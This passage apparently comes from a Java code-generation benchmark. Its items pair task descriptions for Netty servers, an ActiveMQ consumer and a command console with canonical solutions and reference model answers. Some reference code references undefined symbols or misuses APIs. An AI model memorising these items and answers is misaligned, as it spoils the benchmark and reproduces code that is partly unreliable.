    "Instruction": "Task Description: Create a Java class that implements a TCP server using the Netty framework, capable of handling incoming client connections and processing messages.\n\nClass Description: The NettyTcpServer class is a TCP server implementation using Netty's non-blocking I/O. It manages server lifecycle (startup and shutdown) and handles client connections through configurable event loop groups and channel pipelines.\n\nAttributes:\n- serverBootstrap: ServerBootstrap - The main Netty server configuration object\n- bossGroup: EventLoopGroup - Handles incoming connection requests\n- workerGroup: EventLoopGroup - Handles I/O operations for established connections\n- port: int - The port number the server listens on\n\nMethods:\n- NettyTcpServer(int port) -> void - Constructor that initializes the server with specified port\n- start() -> void - Starts the server, binds to the configured port, and begins accepting connections\n- shutdown() -> void - Gracefully shuts down the server and releases resources\n- NettyServerHandler (inner class) - Handles incoming messages and exceptions for client connections\n  - channelRead(ChannelHandlerContext, Object) -> void - Processes incoming messages\n  - exceptionCaught(ChannelHandlerContext, Throwable) -> void - Handles channel exceptions",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class NettyTcpServer {\n\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        this.bossGroup = new NioEventLoopGroup();\n        this.workerGroup = new NioEventLoopGroup();\n        this.serverBootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws InterruptedException {\n        try {\n            serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(port))\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture channelFuture = serverBootstrap.bind().sync();\n            channelFuture.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n            // Message processing logic\n        }\n\n        @Override\n        public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class NettyTcpServer {\n    private final ServerBootstrap serverBootstrap;\n    private final EventLoopGroup bossGroup;\n    private final EventLoopGroup workerGroup;\n    private final int port;\n\n    public NettyTcpServer(int port) {\n        this.port = port;\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n        serverBootstrap = new ServerBootstrap();\n        serverBootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new NettyServerHandler());\n                    }\n                });\n    }\n\n    public void start() {\n        try {\n            ChannelFuture future = serverBootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        }\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    private static class NettyServerHandler extends SimpleChannelInboundHandler<Object> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Object msg) {\n            // Process incoming message\n            System.out.println(\"Received message: \" + msg);\n            ctx.writeAndFlush(msg);\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 197,
    "Instruction": "Task Description: Create a Java class that implements a simple HTTP server using Netty framework, capable of handling incoming HTTP requests and providing graceful shutdown functionality.\n\nClass Description: NettyHttpServer is a class that sets up and manages a Netty-based HTTP server. It initializes the server with configurable options, handles incoming HTTP requests through a pipeline of handlers, and provides methods to control the server lifecycle.\n\nAttributes:\n- bossGroup: EventLoopGroup - Handles incoming connections and accepts them\n- workerGroup: EventLoopGroup - Handles the traffic of accepted connections\n- port: int - The port number on which the server is listening\n\nMethods:\n- init() -> void - Initializes and starts the HTTP server on an available port, setting up the necessary event loop groups and channel pipeline\n- stop() -> void - Shuts down the server gracefully by releasing all resources and closing the event loop groups\n- getUrl(String path) -> String - Constructs and returns a complete URL string using the server's address and the provided path",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport java.net.InetSocketAddress;\n\npublic class NettyHttpServer {\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public void init() {\n        stop();\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        ServerBootstrap b = new ServerBootstrap();\n        b.option(ChannelOption.SO_BACKLOG, 1024);\n        b.group(bossGroup, workerGroup)\n            .channel(NioServerSocketChannel.class)\n            .childHandler(new ChannelInitializer<Channel>() {\n                @Override\n                protected void initChannel(final Channel ch) throws Exception {\n                    ChannelPipeline p = ch.pipeline();\n                    p.addLast(new HttpServerCodec());\n                    p.addLast(NettyHttpTracing.create(httpTracing).serverHandler());\n                    p.addLast(new TestHandler(httpTracing));\n                }\n            });\n\n        try {\n            Channel ch = b.bind(0).sync().channel();\n            port = ((InetSocketAddress) ch.localAddress()).getPort();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new AssertionError(e);\n        }\n    }\n\n    public String getUrl(String path) {\n        return \"http://127.0.0.1:\" + port + path;\n    }\n\n    public void stop() {\n        if (bossGroup != null) bossGroup.shutdownGracefully();\n        if (workerGroup != null) workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\n\npublic class NettyHttpServer {\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final int port;\n    private ChannelFuture channelFuture;\n\n    public NettyHttpServer(int port) {\n        this.port = port;\n    }\n\n    public void init() throws Exception {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HttpRequestDecoder());\n                        ch.pipeline().addLast(new HttpObjectAggregator(65536));\n                        ch.pipeline().addLast(new HttpResponseEncoder());\n                        ch.pipeline().addLast(new SimpleHttpHandler());\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channelFuture = bootstrap.bind(port).sync();\n        channelFuture.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        if (channelFuture != null) {\n            channelFuture.channel().close();\n        }\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public String getUrl(String path) {\n        return \"http://localhost:\" + port + path;\n    }\n}\n```"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle file-related operations over a network connection.\n\nClass Description: FileServer is a Netty-based TCP server that listens on a specified port for incoming connections, processes file-related requests using line-based text communication, and manages server resources efficiently.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Processes the accepted connections' I/O operations\n- port: [int] - The port number on which the server listens for connections\n\nMethods:\n- run: [run(int port)] -> [void] - Initializes and starts the Netty server on the specified port, configuring the server bootstrap with appropriate channel options and handlers\n  - Input: port [int] - The port number to bind the server to\n  - Output: None (void), but starts the server process\n- main: [main(String[] args)] -> [void] - Entry point that creates a FileServer instance and runs it on port 8082 (or a specified port if provided as command-line argument)\n  - Input: args [String[]] - Command line arguments (optional port number)\n  - Output: None (void), but initiates the server startup",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\n\npublic class FileServer {\n\n    public void run(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                            new StringEncoder(CharsetUtil.UTF_8),\n                            new LineBasedFrameDecoder(1024),\n                            new StringDecoder(CharsetUtil.UTF_8),\n                            new FileServerHandler());\n                    }\n                });\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start at port : \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8082;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                e.printStackTrace();\n            }\n        }\n        new FileServer().run(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class FileServer {\n\n    private final int port;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n    public FileServer(int port) {\n        this.port = port;\n    }\n\n    public void run() throws Exception {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                            ch.pipeline().addLast(new StringDecoder());\n                            ch.pipeline().addLast(new StringEncoder());\n                            ch.pipeline().addLast(new FileServerHandler());\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8082;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n        new FileServer(port).run();\n    }\n}\n```"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Implement a Java class that consumes messages from an ActiveMQ broker, supporting both queue and topic message consumption patterns. The class should handle connection management and provide clean resource cleanup.\n\nClass Description: JmsConsumer is a Java class that connects to an ActiveMQ message broker to consume messages from either a queue or a topic. It manages the entire JMS connection lifecycle including connection establishment, session creation, message consumption, and resource cleanup.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection\n- PASSWORD: [String] - Default password for ActiveMQ connection\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection\n- connectionFactory: [ConnectionFactory] - Factory for creating JMS connections\n- connection: [Connection] - Active connection to the message broker\n- session: [Session] - JMS session for message processing\n- destination: [Destination] - Target queue or topic for message consumption\n- messageConsumer: [MessageConsumer] - Consumer instance for receiving messages\n\nMethods:\n- consumeQueueMessages() -> [void] - Consumes messages from a specified queue (\"SAMPLE_MQ_QUEUE\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- consumeTopicMessages() -> [void] - Consumes messages from a specified topic (\"SAMPLE_MQ_TOPIC\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- closeConnection() -> [void] - Closes the JMS connection and releases all resources. Should be called when message consumption is complete.",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"QUEUE\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void consumeTopicMessages() throws JMSException {\n        destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"TOPIC\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (JMSException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "right_result": "```java\nimport org.apache.activemq.ActiveMQConnectionFactory;\nimport javax.jms.*;\n\npublic class JmsConsumer {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"admin\";\n    private static final String BROKERURL = \"tcp://localhost:61616\";\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() {\n        try {\n            connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKERURL);\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n            messageConsumer = session.createConsumer(destination);\n\n            while (true) {\n                TextMessage message = (TextMessage) messageConsumer.receive(5000);\n                if (message == null) {\n                    break;\n                }\n                System.out.println(\"Received from queue: \" + message.getText());\n            }\n\n        } catch (JMSException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection();\n        }\n    }\n\n    public void consumeTopicMessages() {\n        try {\n            connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKERURL);\n            connection = connectionFactory.createConnection();\n            connection.start();\n            session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n            destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n            messageConsumer = session.createConsumer(destination);\n\n            while (true) {\n                TextMessage message = (TextMessage) messageConsumer.receive(5000);\n                if (message == null) {\n                    break;\n                }\n                System.out.println(\"Received from topic: \" + message.getText());\n            }\n\n        } catch (JMSException e) {\n            e.printStackTrace();\n        } finally {\n            closeConnection();\n        }\n    }\n\n    public void closeConnection() {\n        try {\n            if (messageConsumer != null) messageConsumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework for handling client connections and message passing in a chat application.\n\nClass Description: The CIMServer class is a Spring component that initializes and manages a Netty-based TCP server. It handles client connections, maintains session information, and provides functionality to send messages to connected clients.\n\nAttributes:\n- boss: [EventLoopGroup] - Handles incoming connections and distributes them to worker threads\n- work: [EventLoopGroup] - Handles I/O operations for established connections\n- nettyPort: [int] - The port number on which the server listens for incoming connections\n\nMethods:\n- start(): [void]() -> [void] - Initializes and starts the Netty server (annotated with @PostConstruct)\n- destroy(): [void]() -> [void] - Shuts down the server gracefully (annotated with @PreDestroy)\n- sendMsg(): [void]([SendMsgReqVO sendMsgReqVO]) -> [void] - Sends a message to a specific client identified by user ID",
    "Canonical_solution": "import com.crossoverjie.cim.common.protocol.BaseCommand;\nimport com.crossoverjie.cim.common.protocol.Request;\nimport com.crossoverjie.cim.server.api.vo.req.SendMsgReqVO;\nimport com.crossoverjie.cim.server.init.CIMServerInitializer;\nimport com.crossoverjie.cim.server.util.SessionSocketHolder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport jakarta.annotation.PostConstruct;\nimport jakarta.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss = new NioEventLoopGroup();\n    private EventLoopGroup work = new NioEventLoopGroup();\n\n    @Value(\"${cim.server.port}\")\n    private int nettyPort;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap()\n                .group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(nettyPort))\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new CIMServerInitializer());\n\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            log.info(\"Start cim server success!!!\");\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully().syncUninterruptibly();\n        work.shutdownGracefully().syncUninterruptibly();\n        log.info(\"Close cim server success!!!\");\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        NioSocketChannel socketChannel = SessionSocketHolder.get(sendMsgReqVO.getUserId());\n\n        if (null == socketChannel) {\n            log.error(\"client {} offline!\", sendMsgReqVO.getUserId());\n            return;\n        }\n        Request protocol = Request.newBuilder()\n                .setRequestId(sendMsgReqVO.getUserId())\n                .setReqMsg(sendMsgReqVO.getMsg())\n                .putAllProperties(sendMsgReqVO.getProperties())\n                .setCmd(BaseCommand.MESSAGE)\n                .build();\n\n        ChannelFuture future = socketChannel.writeAndFlush(protocol);\n        future.addListener((ChannelFutureListener) channelFuture ->\n                log.info(\"server push msg:[{}]\", sendMsgReqVO.toString()));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport org.springframework.stereotype.Component;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport javax.annotation.PostConstruct;\nimport javax.annotation.PreDestroy;\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss = new NioEventLoopGroup(1);\n    private EventLoopGroup work = new NioEventLoopGroup();\n    private int nettyPort = 8080;\n    private Map<String, Channel> userChannels = new ConcurrentHashMap<>();\n\n    @PostConstruct\n    public void start() {\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(boss, work)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new CIMServerHandler(userChannels));\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(nettyPort).sync();\n            future.channel().closeFuture().sync();\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            shutdown();\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        shutdown();\n    }\n\n    private void shutdown() {\n        boss.shutdownGracefully();\n        work.shutdownGracefully();\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        String userId = sendMsgReqVO.getUserId();\n        String message = sendMsgReqVO.getMessage();\n        Channel channel = userChannels.get(userId);\n        if (channel != null && channel.isActive()) {\n            channel.writeAndFlush(message);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle multiple client connections and manage them through a channel group.\n\nClass Description: The ChatServer class is a Netty-based TCP server that manages client connections through channel groups. It provides methods to start the server on a specified address and properly shut it down while releasing all resources.\n\nAttributes:\n- channelGroup: [ChannelGroup] - Maintains all active client channels for group operations\n- bossGroup: [EventLoopGroup] - Handles incoming connection requests\n- workGroup: [EventLoopGroup] - Handles I/O operations for established connections\n- channel: [Channel] - Represents the server's listening channel\n\nMethods:\n- start: [Name]([InetSocketAddress address]) -> [ChannelFuture] - Starts the server on the specified address, configures server options, and initializes the channel pipeline with handlers\n- destroy: [Name]() -> [void] - Properly shuts down the server by closing all channels and releasing thread resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.ImmediateEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n    \n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChatServerInitializer(channelGroup))\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n        \n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n    \n    public void destroy() {\n        if(channel != null) {\n            channel.close();\n        }\n        \n        channelGroup.close();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.util.concurrent.GlobalEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<Channel>() {\n                    @Override\n                    protected void initChannel(Channel ch) {\n                        ch.pipeline().addLast(channelGroup);\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        ChannelFuture future = bootstrap.bind(address);\n        this.channel = future.syncUninterruptibly().channel();\n        return future;\n    }\n\n    public void destroy() {\n        if (channel != null) {\n            channel.close();\n        }\n        channelGroup.close();\n        bossGroup.shutdownGracefully();\n        workGroup.shutdownGracefully();\n    }\n}\n```"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that listens for incoming connections, processes command-based requests, and returns appropriate responses. The server should support multiple commands and maintain a clean connection lifecycle.\n\nClass Description: Console is a singleton class that implements a TCP server with command processing capabilities. It maintains a registry of available commands and handles client connections using Netty's NIO framework.\n\nAttributes:\n- instance: Console - Singleton instance of the Console class\n- commands: Map<String, Class> - Registry mapping command strings to their respective Command classes\n\nMethods:\n- getInstance() -> Console - Returns the singleton instance of Console, initializing it with default commands if not already created\n- listenOnTCP(int port) -> void - Starts a TCP server on the specified port using Netty framework\n- Adapter: ChannelInboundHandlerAdapter - Inner class handling channel events and command processing\n  - channelRead(ChannelHandlerContext ctx, Object msg) -> void - Processes incoming messages as commands\n  - channelActive(ChannelHandlerContext ctx) -> void - Handles new connection initialization\n  - channelReadComplete(ChannelHandlerContext ctx) -> void - Handles post-read operations\n  - sendStringL(ChannelHandlerContext ctx, String text) -> void - Sends string with newline if missing\n  - sendString(ChannelHandlerContext ctx, String text) -> void - Sends string to client\n  - sendPrompt(ChannelHandlerContext ctx) -> void - Sends command prompt to client\n- Command: abstract static class - Base class for all command implementations\n  - Command(String command) - Constructor taking the command string\n  - execute() -> String - Abstract method to be implemented by concrete commands\n- HelpCommand: static class extends Command - Implements help command\n  - HelpCommand(String command) - Constructor\n  - execute() -> String - Returns help message\n- HelloCommand: static class extends Command - Implements hello command\n  - HelloCommand(String command) - Constructor\n  - execute() -> String - Returns random greeting message\n- DeviceCommand: static class extends Command - Implements device command\n  - DeviceCommand(String command) - Constructor\n  - execute() -> String - Returns device information in JSON format",
    "Canonical_solution": "import com.yeetor.androidcontrol.server.BaseServer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Console {\n\n    private static Console instance;\n    private Map<String, Class> commands;\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n            instance.commands = new HashMap<>();\n            instance.commands.put(\"help\", HelpCommand.class);\n            instance.commands.put(\"hello\", HelloCommand.class);\n            instance.commands.put(\"device\", DeviceCommand.class);\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            